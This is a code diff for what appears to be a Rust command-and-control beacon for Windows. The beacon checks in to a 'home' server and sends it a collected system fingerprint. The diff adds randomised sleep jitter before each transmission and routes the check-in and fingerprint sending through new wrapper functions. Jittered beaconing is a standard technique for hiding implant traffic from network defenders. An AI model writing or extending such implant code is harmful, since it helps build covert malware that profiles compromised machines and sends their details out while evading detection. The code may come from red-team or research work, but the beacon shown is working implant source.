@@ -3,7 +3,7 @@ use client::*;
 use log::{debug, info};
 use std::{
     net::SocketAddrV4,
-    time::{SystemTime, UNIX_EPOCH},
+    time::{Duration, SystemTime, UNIX_EPOCH},
 };
 use windows::core::HSTRING;
 
@@ -13,6 +13,8 @@ pub struct Beacon {
     id: u32,
     client: Client,
     home: SocketAddrV4,
+    base_jitter: Duration,
+    rate: f64,
 }
 
 impl Beacon {
@@ -23,10 +25,32 @@ impl Beacon {
             .unwrap()
             .subsec_nanos();
 
-        Ok(Self { client, id, home })
+        Ok(Self {
+            client,
+            id,
+            home,
+            base_jitter: Duration::from_secs(5),
+            rate: 0.5,
+        })
     }
 
-    pub fn initial_request(&mut self) -> windows::core::Result<()> {
+    fn send<F>(&mut self, f: F) -> windows::core::Result<()>
+    where
+        F: FnOnce(&mut Self) -> windows::core::Result<()>,
+    {
+        self.sleep_with_jitter();
+        f(self)
+    }
+
+    pub fn send_initial_request(&mut self) -> windows::core::Result<()> {
+        self.send(|beacon| beacon.initial_request())
+    }
+
+    pub fn send_system_info(&mut self) -> windows::core::Result<()> {
+        self.send(|beacon| beacon.system_info())
+    }
+
+    fn initial_request(&mut self) -> windows::core::Result<()> {
         info!(
             "sending initial request to {}:{}",
             self.home.ip(),
@@ -57,7 +81,7 @@ impl Beacon {
         Ok(())
     }
 
-    pub fn send_system_info(&mut self) -> windows::core::Result<()> {
+    fn system_info(&mut self) -> windows::core::Result<()> {
         info!("collecting system info...");
         let sys_info = collector::SystemFingerprint::collect()?;
 
@@ -87,6 +111,39 @@ impl Beacon {
         info!("response headers: {:?}", resp.headers);
 
         Ok(())
+    }
+
+    fn sleep_with_jitter(&self) {
+        let base_ms = self.base_jitter.as_millis() as i64;
+        if base_ms == 0 {
+            return;
+        }
+
+        let rate = self.rate.clamp(0.0, 1.0);
+
+        let jitter_ms = (base_ms as f64 * rate) as i64;
+        if jitter_ms == 0 {
+            info!(
+                "sleeping for approximately {} secs",
+                self.base_jitter.as_secs()
+            );
+            std::thread::sleep(self.base_jitter);
+            return;
+        }
+
+        let nanos = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap()
+            .subsec_nanos() as i64;
+
+        let offset = (nanos % (2 * jitter_ms + 1)) - jitter_ms;
+        let result_ms = (base_ms + offset).max(0);
+
+        info!(
+            "sleeping for approximately {} secs",
+            Duration::from_millis(result_ms as u64).as_secs()
+        );
+        std::thread::sleep(Duration::from_millis(result_ms as u64));
     }
 }
 
